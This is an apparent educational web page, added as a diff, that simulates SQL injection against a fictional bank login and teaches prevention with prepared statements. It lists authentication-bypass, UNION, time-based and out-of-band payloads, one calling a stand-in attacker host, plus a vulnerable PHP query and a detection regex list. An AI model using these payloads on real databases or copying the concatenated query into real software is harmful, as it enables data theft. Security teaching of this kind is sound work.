@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Demo - CyberSec Education Lab</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        .vulnerable-app {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            margin: 2rem 0;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        .app-header {
+            background: linear-gradient(135deg, #1e3a8a, #1e40af);
+            color: white;
+            padding: 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .app-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grid" width="10" height="10" patternUnits="userSpaceOnUse"><path d="M 10 0 L 0 0 0 10" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)"/></svg>');
+            opacity: 0.3;
+        }
+
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .bank-logo i {
+            font-size: 2.5rem;
+            color: #fbbf24;
+        }
+
+        .bank-info {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .bank-info h3 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            letter-spacing: 1px;
+        }
+
+        .bank-info p {
+            opacity: 0.9;
+            font-size: 0.95rem;
+        }
+
+        .security-badge {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: rgba(255,255,255,0.2);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            z-index: 1;
+        }
+
+        .app-content {
+            padding: 3rem 2rem;
+            color: #000000;
+            background: linear-gradient(to bottom, #f8fafc, #ffffff);
+            min-height: 500px;
+        }
+
+        .login-form, .signup-form {
+            max-width: 420px;
+            margin: 0 auto 2rem auto;
+            padding: 2.5rem;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            background: #ffffff;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            position: relative;
+        }
+
+        .login-form::before, .signup-form::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #1e40af, #3b82f6, #60a5fa);
+            border-radius: 12px 12px 0 0;
+        }
+
+        .form-title {
+            text-align: center;
+            margin-bottom: 2rem;
+            color: #1f2937;
+        }
+
+        .form-title h4 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .form-subtitle {
+            color: #6b7280;
+            font-size: 0.9rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #374151;
+            font-size: 0.9rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 1rem;
+            color: #1f2937;
+            background: #ffffff;
+            box-sizing: border-box;
+            transition: all 0.2s ease;
+            font-family: inherit;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #9ca3af;
+        }
+
+        .form-button {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            background: linear-gradient(135deg, #1e40af, #3b82f6);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-button:hover {
+            background: linear-gradient(135deg, #1e3a8a, #2563eb);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+        }
+
+        .form-button:active {
+            transform: translateY(0);
+        }
+
+        .tab-buttons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 3rem;
+            gap: 0;
+            background: #f1f5f9;
+            padding: 0.5rem;
+            border-radius: 12px;
+            max-width: 300px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 0.75rem 1.5rem;
+            background: transparent;
+            color: #64748b;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .tab-button.active {
+            background: #ffffff;
+            color: #1e40af;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .tab-button:hover:not(.active) {
+            color: #475569;
+            background: rgba(255, 255, 255, 0.5);
+        }
+
+        .sql-query-display {
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 1.5rem;
+            border-radius: 12px;
+            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
+            margin: 2rem 0;
+            border: 1px solid #334155;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .sql-query-display::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #ef4444, #f97316, #eab308);
+        }
+
+        .query-label {
+            color: #3498db;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .vulnerable-query {
+            color: #e74c3c;
+        }
+
+        .safe-query {
+            color: #27ae60;
+        }
+
+        .database-viewer {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 10px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            color: #e9ecef;
+        }
+
+        .database-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            background: white;
+            color: #000000;
+        }
+
+        .database-table th,
+        .database-table td {
+            border: 1px solid #ddd;
+            padding: 0.8rem;
+            text-align: left;
+        }
+
+        .database-table th {
+            background: #f8f9fa;
+            font-weight: bold;
+        }
+
+        .database-table tr:nth-child(even) {
+            background: #f2f2f2;
+        }
+
+        .attack-result {
+            background: linear-gradient(135deg, #fef2f2, #ffffff);
+            border: 2px solid #ef4444;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            color: #1f2937;
+            display: none;
+            position: relative;
+            box-shadow: 0 4px 6px -1px rgba(239, 68, 68, 0.1);
+        }
+
+        .attack-result::before {
+            content: '⚠️';
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            background: #ef4444;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+        }
+
+        .success-result {
+            background: linear-gradient(135deg, #f0fdf4, #ffffff);
+            border: 2px solid #22c55e;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            color: #1f2937;
+            display: none;
+            position: relative;
+            box-shadow: 0 4px 6px -1px rgba(34, 197, 94, 0.1);
+        }
+
+        .success-result::before {
+            content: '✅';
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            background: #22c55e;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+        }
+
+        .injection-examples {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+
+        .payload-button {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0.2rem;
+            font-size: 0.9rem;
+        }
+
+        .payload-button:hover {
+            background: #c82333;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .code-snippet {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 1rem;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+
+        .vulnerability-explanation {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+
+        .mitigation-tip {
+            background: rgba(46, 160, 67, 0.1);
+            border-left: 4px solid #2ea043;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #e9ecef;
+        }
+
+        .trust-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: rgba(59, 130, 246, 0.05);
+            border-radius: 8px;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            color: #64748b;
+        }
+
+        .trust-badge i {
+            color: #22c55e;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .spinner {
+            border: 3px solid #f3f4f6;
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .realistic-footer {
+            text-align: center;
+            padding: 2rem;
+            background: #f8fafc;
+            border-top: 1px solid #e5e7eb;
+            font-size: 0.8rem;
+            color: #6b7280;
+        }
+
+        .realistic-footer a {
+            color: #3b82f6;
+            text-decoration: none;
+            margin: 0 1rem;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <h1>CyberSec Education Lab</h1>
+            </div>
+            <nav class="nav">
+                <a href="index.html" class="nav-link">Home</a>
+                <a href="#" class="nav-link active">SQL Injection Demo</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <div class="demo-container">
+                <h1><i class="fas fa-database"></i> SQL Injection Attack Demonstration</h1>
+
+                <div class="alert alert-warning">
+                    <strong><i class="fas fa-exclamation-triangle"></i> Educational Warning:</strong>
+                    This demonstrates SQL injection vulnerabilities in a safe, simulated environment. Never attempt these attacks on real systems.
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">1</span>Understanding SQL Injection</h2>
+                    <p>SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers can manipulate SQL queries to access, modify, or delete data they shouldn't have access to.</p>
+
+                    <div class="vulnerability-explanation">
+                        <h4><i class="fas fa-bug"></i> How SQL Injection Works:</h4>
+                        <ul>
+                            <li><strong>User Input:</strong> Application accepts user input without proper validation</li>
+                            <li><strong>Query Construction:</strong> Input is directly concatenated into SQL queries</li>
+                            <li><strong>Malicious Payload:</strong> Attacker injects SQL code through input fields</li>
+                            <li><strong>Database Execution:</strong> Database executes the malicious SQL commands</li>
+                            <li><strong>Data Exposure:</strong> Sensitive data is accessed or manipulated</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">2</span>Vulnerable Application Demo</h2>
+                    <p>Below is a simulated vulnerable login/signup application. Try normal login first, then attempt SQL injection:</p>
+
+                    <div class="vulnerable-app">
+                        <div class="app-header">
+                            <div class="security-badge">
+                                <i class="fas fa-lock"></i> SSL Secured
+                            </div>
+                            <div class="bank-logo">
+                                <i class="fas fa-university"></i>
+                                <div class="bank-info">
+                                    <h3>SecureBank</h3>
+                                    <p>Online Banking Portal • Trusted Since 1995</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="app-content">
+                            <div class="tab-buttons">
+                                <button class="tab-button active" onclick="showTab('login')">Login</button>
+                                <button class="tab-button" onclick="showTab('signup')">Sign Up</button>
+                            </div>
+
+                            <!-- Login Form -->
+                            <div id="login-tab" class="tab-content">
+                                <form class="login-form" onsubmit="attemptLogin(event)">
+                                    <div class="form-title">
+                                        <h4><i class="fas fa-sign-in-alt"></i> Welcome Back</h4>
+                                        <p class="form-subtitle">Sign in to access your account</p>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Username or Email</label>
+                                        <input type="text" id="login-username" class="form-input" placeholder="Enter your username" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Password</label>
+                                        <input type="password" id="login-password" class="form-input" placeholder="Enter your password" required>
+                                    </div>
+                                    <button type="submit" class="form-button">
+                                        <i class="fas fa-sign-in-alt"></i> Sign In Securely
+                                    </button>
+                                    <div style="text-align: center; margin-top: 1rem; font-size: 0.85rem; color: #6b7280;">
+                                        <a href="#" style="color: #3b82f6; text-decoration: none;">Forgot your password?</a>
+                                    </div>
+                                </form>
+                            </div>
+
+                            <!-- Signup Form -->
+                            <div id="signup-tab" class="tab-content hidden">
+                                <form class="signup-form" onsubmit="attemptSignup(event)">
+                                    <div class="form-title">
+                                        <h4><i class="fas fa-user-plus"></i> Join SecureBank</h4>
+                                        <p class="form-subtitle">Create your secure banking account</p>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Full Name</label>
+                                        <input type="text" id="signup-name" class="form-input" placeholder="Enter your full name" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Username</label>
+                                        <input type="text" id="signup-username" class="form-input" placeholder="Choose a username" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Email Address</label>
+                                        <input type="email" id="signup-email" class="form-input" placeholder="Enter your email" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label class="form-label">Password</label>
+                                        <input type="password" id="signup-password" class="form-input" placeholder="Create a strong password" required>
+                                    </div>
+                                    <button type="submit" class="form-button">
+                                        <i class="fas fa-user-plus"></i> Create Account
+                                    </button>
+                                    <div style="text-align: center; margin-top: 1rem; font-size: 0.8rem; color: #6b7280;">
+                                        By creating an account, you agree to our <a href="#" style="color: #3b82f6;">Terms of Service</a>
+                                    </div>
+                                </form>
+                            </div>
+
+                            <!-- Trust Indicators -->
+                            <div class="trust-indicators">
+                                <div class="trust-badge">
+                                    <i class="fas fa-shield-alt"></i>
+                                    <span>256-bit SSL Encryption</span>
+                                </div>
+                                <div class="trust-badge">
+                                    <i class="fas fa-check-circle"></i>
+                                    <span>FDIC Insured</span>
+                                </div>
+                                <div class="trust-badge">
+                                    <i class="fas fa-lock"></i>
+                                    <span>Bank-Grade Security</span>
+                                </div>
+                            </div>
+
+                            <!-- Loading Spinner -->
+                            <div id="loading-spinner" class="loading-spinner">
+                                <div class="spinner"></div>
+                                <p style="margin-top: 1rem; color: #6b7280;">Authenticating...</p>
+                            </div>
+
+                            <!-- SQL Query Display -->
+                            <div class="sql-query-display">
+                                <span class="query-label">🔍 Generated SQL Query:</span>
+                                <div id="sql-output">SELECT * FROM users WHERE username = '' AND password = ''</div>
+                            </div>
+
+                            <!-- Results -->
+                            <div id="attack-result" class="attack-result">
+                                <h4><i class="fas fa-exclamation-triangle"></i> SQL Injection Successful!</h4>
+                                <p id="attack-message"></p>
+                            </div>
+
+                            <div id="success-result" class="success-result">
+                                <h4><i class="fas fa-check-circle"></i> Login Successful!</h4>
+                                <p id="success-message"></p>
+                            </div>
+
+                            <!-- Realistic Footer -->
+                            <div class="realistic-footer">
+                                <p>&copy; 2024 SecureBank. All rights reserved.</p>
+                                <div>
+                                    <a href="#">Privacy Policy</a>
+                                    <a href="#">Terms of Service</a>
+                                    <a href="#">Security Center</a>
+                                    <a href="#">Contact Support</a>
+                                </div>
+                                <p style="margin-top: 1rem; font-size: 0.7rem;">
+                                    Member FDIC • Equal Housing Lender • NMLS ID: 123456
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">3</span>Common SQL Injection Payloads</h2>
+                    <p>Try these common SQL injection payloads in the login form above:</p>
+
+                    <div class="injection-examples">
+                        <h4><i class="fas fa-code"></i> Authentication Bypass Examples:</h4>
+                        <p>Click any payload to automatically fill the username field:</p>
+                        <div style="margin: 1rem 0;">
+                            <button class="payload-button" onclick="insertPayload('admin\\'--', 'login-username')">admin'--</button>
+                            <button class="payload-button" onclick="insertPayload('\\' OR 1=1--', 'login-username')">' OR 1=1--</button>
+                            <button class="payload-button" onclick="insertPayload('\\' OR \\'a\\'=\\'a', 'login-username')">' OR 'a'='a</button>
+                            <button class="payload-button" onclick="insertPayload('admin\\' OR 1=1#', 'login-username')">admin' OR 1=1#</button>
+                        </div>
+
+                        <h4>How These Work:</h4>
+                        <ul>
+                            <li><strong>admin'--:</strong> Comments out the password check</li>
+                            <li><strong>' OR 1=1--:</strong> Always true condition bypasses authentication</li>
+                            <li><strong>' OR 'a'='a:</strong> Another always true condition</li>
+                            <li><strong>admin' OR 1=1#:</strong> MySQL comment syntax</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">4</span>Technical Analysis</h2>
+
+                    <div class="code-snippet">
+                        <strong>Vulnerable Code Example (PHP):</strong><br><br>
+                        $username = $_POST['username'];<br>
+                        $password = $_POST['password'];<br><br>
+                        $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";<br>
+                        $result = mysqli_query($connection, $query);
+                    </div>
+
+                    <div class="vulnerability-explanation">
+                        <h4><i class="fas fa-bug"></i> Why This is Vulnerable:</h4>
+                        <ul>
+                            <li><strong>Direct Concatenation:</strong> User input directly inserted into SQL query</li>
+                            <li><strong>No Input Validation:</strong> Special characters not escaped or filtered</li>
+                            <li><strong>No Parameterization:</strong> Query structure can be modified by user input</li>
+                            <li><strong>Insufficient Access Controls:</strong> Database user has excessive privileges</li>
+                        </ul>
+                    </div>
+
+                    <div class="code-snippet">
+                        <strong>Attack Example:</strong><br><br>
+                        Input: username = "admin'--", password = "anything"<br><br>
+                        Generated Query:<br>
+                        <span style="color: #e74c3c;">SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'</span><br><br>
+                        Executed Query:<br>
+                        <span style="color: #e74c3c;">SELECT * FROM users WHERE username = 'admin'</span><br>
+                        <span style="color: #95a5a6;">-- (password check is commented out)</span>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">5</span>Types of SQL Injection</h2>
+
+                    <div class="education-grid">
+                        <div class="education-card">
+                            <h3><i class="fas fa-eye"></i> In-Band SQLi</h3>
+                            <p><strong>Error-based:</strong> Uses database error messages to extract information</p>
+                            <p><strong>Union-based:</strong> Uses UNION operator to combine results from multiple queries</p>
+                            <div class="code-snippet" style="font-size: 0.8rem;">
+                                ' UNION SELECT username, password FROM users--
+                            </div>
+                        </div>
+
+                        <div class="education-card">
+                            <h3><i class="fas fa-eye-slash"></i> Blind SQLi</h3>
+                            <p><strong>Boolean-based:</strong> Uses true/false responses to extract data</p>
+                            <p><strong>Time-based:</strong> Uses database delays to infer information</p>
+                            <div class="code-snippet" style="font-size: 0.8rem;">
+                                ' AND (SELECT SLEEP(5))--
+                            </div>
+                        </div>
+
+                        <div class="education-card">
+                            <h3><i class="fas fa-network-wired"></i> Out-of-Band SQLi</h3>
+                            <p>Uses different communication channels (DNS, HTTP) to extract data</p>
+                            <p>Less common but can bypass certain security measures</p>
+                            <div class="code-snippet" style="font-size: 0.8rem;">
+                                '; EXEC xp_dirtree '\\\\attacker.com\\share'--
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">6</span>Prevention and Mitigation</h2>
+
+                    <div class="mitigation-tip">
+                        <h3><i class="fas fa-shield-alt"></i> Secure Coding Practices:</h3>
+
+                        <h4>1. Parameterized Queries (Prepared Statements):</h4>
+                        <div class="code-snippet">
+                            <strong>Secure PHP Example:</strong><br><br>
+                            $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");<br>
+                            $stmt->execute([$username, $password]);<br>
+                            $user = $stmt->fetch();
+                        </div>
+
+                        <h4>2. Input Validation and Sanitization:</h4>
+                        <ul>
+                            <li>Whitelist allowed characters</li>
+                            <li>Escape special SQL characters</li>
+                            <li>Validate data types and lengths</li>
+                            <li>Use regular expressions for format validation</li>
+                        </ul>
+
+                        <h4>3. Principle of Least Privilege:</h4>
+                        <ul>
+                            <li>Database users should have minimal necessary permissions</li>
+                            <li>Separate database accounts for different application functions</li>
+                            <li>Disable unnecessary database features and functions</li>
+                            <li>Regular security audits and access reviews</li>
+                        </ul>
+
+                        <h4>4. Additional Security Measures:</h4>
+                        <ul>
+                            <li><strong>Web Application Firewalls (WAF):</strong> Filter malicious requests</li>
+                            <li><strong>Database Activity Monitoring:</strong> Detect suspicious queries</li>
+                            <li><strong>Regular Security Testing:</strong> Automated and manual testing</li>
+                            <li><strong>Error Handling:</strong> Don't expose database errors to users</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="demo-step">
+                    <h2><span class="step-number">7</span>Real-World Impact</h2>
+
+                    <div class="vulnerability-explanation">
+                        <h4><i class="fas fa-exclamation-triangle"></i> Consequences of SQL Injection:</h4>
+                        <ul>
+                            <li><strong>Data Breach:</strong> Unauthorized access to sensitive information</li>
+                            <li><strong>Data Manipulation:</strong> Modification or deletion of critical data</li>
+                            <li><strong>Authentication Bypass:</strong> Unauthorized system access</li>
+                            <li><strong>Privilege Escalation:</strong> Gaining administrative access</li>
+                            <li><strong>Denial of Service:</strong> Database performance degradation</li>
+                            <li><strong>Compliance Violations:</strong> GDPR, HIPAA, PCI-DSS penalties</li>
+                            <li><strong>Reputation Damage:</strong> Loss of customer trust</li>
+                            <li><strong>Financial Loss:</strong> Direct costs and legal liabilities</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="alert alert-success">
+                    <strong><i class="fas fa-graduation-cap"></i> Key Takeaways:</strong>
+                    <ul>
+                        <li>Always use parameterized queries/prepared statements</li>
+                        <li>Validate and sanitize all user input</li>
+                        <li>Implement proper error handling that doesn't expose system details</li>
+                        <li>Follow the principle of least privilege for database access</li>
+                        <li>Regular security testing and code reviews are essential</li>
+                        <li>SQL injection remains one of the most critical web application vulnerabilities</li>
+                    </ul>
+                </div>
+
+                <div style="text-align: center; margin-top: 2rem;">
+                    <a href="download-demo.html" class="demo-btn">← Previous: Download Demo</a>
+                    <a href="index.html" class="demo-btn">Back to Main Lab</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 CyberSec Education Lab. For educational purposes only.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Simulated user database
+        const userDatabase = [
+            { id: 1, username: 'admin', password: 'admin123', email: 'admin@securebank.com', name: 'System Administrator', role: 'admin' },
+            { id: 2, username: 'john_doe', password: 'password123', email: 'john@email.com', name: 'John Doe', role: 'user' },
+            { id: 3, username: 'jane_smith', password: 'mypassword', email: 'jane@email.com', name: 'Jane Smith', role: 'user' },
+            { id: 4, username: 'bob_wilson', password: 'secret456', email: 'bob@email.com', name: 'Bob Wilson', role: 'user' },
+            { id: 5, username: 'alice_brown', password: 'alice2023', email: 'alice@email.com', name: 'Alice Brown', role: 'manager' }
+        ];
+
+        function showTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.add('hidden');
+            });
+
+            // Remove active class from all buttons
+            document.querySelectorAll('.tab-button').forEach(btn => {
+                btn.classList.remove('active');
+            });
+
+            // Show selected tab
+            document.getElementById(tabName + '-tab').classList.remove('hidden');
+            event.target.classList.add('active');
+
+            // Reset query display
+            if (tabName === 'login') {
+                document.getElementById('sql-output').textContent = "SELECT * FROM users WHERE username = '' AND password = ''";
+            } else {
+                document.getElementById('sql-output').textContent = "INSERT INTO users (name, username, email, password) VALUES ('', '', '', '')";
+            }
+
+            hideResults();
+        }
+
+        function hideResults() {
+            document.getElementById('attack-result').style.display = 'none';
+            document.getElementById('success-result').style.display = 'none';
+        }
+
+        function attemptLogin(event) {
+            event.preventDefault();
+            hideResults();
+
+            // Show loading spinner for realism
+            document.getElementById('loading-spinner').style.display = 'block';
+
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+
+            // Display the SQL query that would be generated
+            const sqlQuery = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+            document.getElementById('sql-output').innerHTML = `<span class="vulnerable-query">${sqlQuery}</span>`;
+
+            // Check for SQL injection attempts
+            const sqlInjectionPatterns = [
+                /'/,
+                /--/,
+                /;/,
+                /union/i,
+                /select/i,
+                /drop/i,
+                /delete/i,
+                /insert/i,
+                /update/i,
+                /or\s+1\s*=\s*1/i,
+                /or\s+true/i,
+                /admin'\s*--/i
+            ];
+
+            let isInjection = false;
+            let injectionType = '';
+
+            for (let pattern of sqlInjectionPatterns) {
+                if (pattern.test(username) || pattern.test(password)) {
+                    isInjection = true;
+                    if (pattern.test(username + password)) {
+                        if (/or\s+1\s*=\s*1/i.test(username + password)) {
+                            injectionType = 'Boolean-based SQL injection detected!';
+                        } else if (/union/i.test(username + password)) {
+                            injectionType = 'UNION-based SQL injection detected!';
+                        } else if (/--/.test(username + password)) {
+                            injectionType = 'Comment-based SQL injection detected!';
+                        } else {
+                            injectionType = 'SQL injection attempt detected!';
+                        }
+                    }
+                    break;
+                }
+            }
+
+            // Simulate realistic loading time
+            setTimeout(() => {
+                document.getElementById('loading-spinner').style.display = 'none';
+
+                if (isInjection) {
+                    // Show attack result
+                    document.getElementById('attack-result').style.display = 'block';
+                    document.getElementById('attack-message').innerHTML = `
+                        <strong>${injectionType}</strong><br>
+                        The malicious query bypassed authentication and could expose all user data!<br>
+                        <strong>Potential Impact:</strong> Unauthorized access, data theft, privilege escalation
+                    `;
+
+                    // Simulate data exposure
+                    setTimeout(() => {
+                        showDatabaseData();
+                    }, 1000);
+
+                } else {
+                    // Check for legitimate login
+                    const user = userDatabase.find(u => u.username === username && u.password === password);
+                    if (user) {
+                        document.getElementById('success-result').style.display = 'block';
+                        document.getElementById('success-message').textContent = `Welcome back, ${user.name}! Login successful.`;
+                    } else {
+                        document.getElementById('attack-result').style.display = 'block';
+                        document.getElementById('attack-message').textContent = 'Invalid username or password. Please try again.';
+                    }
+                }
+            }, 1500); // Realistic loading time
+        }
+
+        function attemptSignup(event) {
+            event.preventDefault();
+            hideResults();
+
+            const name = document.getElementById('signup-name').value;
+            const username = document.getElementById('signup-username').value;
+            const email = document.getElementById('signup-email').value;
+            const password = document.getElementById('signup-password').value;
+
+            // Display the SQL query that would be generated
+            const sqlQuery = `INSERT INTO users (name, username, email, password) VALUES ('${name}', '${username}', '${email}', '${password}')`;
+            document.getElementById('sql-output').innerHTML = `<span class="vulnerable-query">${sqlQuery}</span>`;
+
+            // Check for SQL injection in any field
+            const allInputs = [name, username, email, password];
+            const hasInjection = allInputs.some(input =>
+                /'/.test(input) || /--/.test(input) || /;/.test(input) || /union/i.test(input)
+            );
+
+            if (hasInjection) {
+                document.getElementById('attack-result').style.display = 'block';
+                document.getElementById('attack-message').innerHTML = `
+                    <strong>SQL Injection in Registration Form!</strong><br>
+                    Malicious SQL detected in form data. This could lead to:<br>
+                    • Database corruption<br>
+                    • Unauthorized data insertion<br>
+                    • Privilege escalation<br>
+                    • System compromise
+                `;
+            } else {
+                document.getElementById('success-result').style.display = 'block';
+                document.getElementById('success-message').textContent = `Account created successfully for ${name}!`;
+            }
+        }
+
+        function showDatabaseData() {
+            // This would normally not be shown, but for educational purposes we'll display it
+            const existingViewer = document.querySelector('.database-viewer');
+            if (existingViewer) {
+                existingViewer.remove();
+            }
+
+            const viewer = document.createElement('div');
+            viewer.className = 'database-viewer';
+            viewer.innerHTML = `
+                <h4><i class="fas fa-database"></i> Exposed Database Contents</h4>
+                <p><strong>⚠️ This is what an attacker could access:</strong></p>
+                <table class="database-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Email</th>
+                            <th>Name</th>
+                            <th>Role</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${userDatabase.map(user => `
+                            <tr>
+                                <td>${user.id}</td>
+                                <td>${user.username}</td>
+                                <td>${user.password}</td>
+                                <td>${user.email}</td>
+                                <td>${user.name}</td>
+                                <td>${user.role}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+                <p style="color: #f85149; font-weight: bold; margin-top: 1rem;">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    All user credentials and personal information exposed!
+                </p>
+            `;
+
+            document.querySelector('.vulnerable-app').appendChild(viewer);
+        }
+
+        // Add some example payloads for educational purposes
+        function insertPayload(payload, field) {
+            document.getElementById(field).value = payload;
+            document.getElementById(field).focus();
+        }
+    </script>
+</body>
+</html>
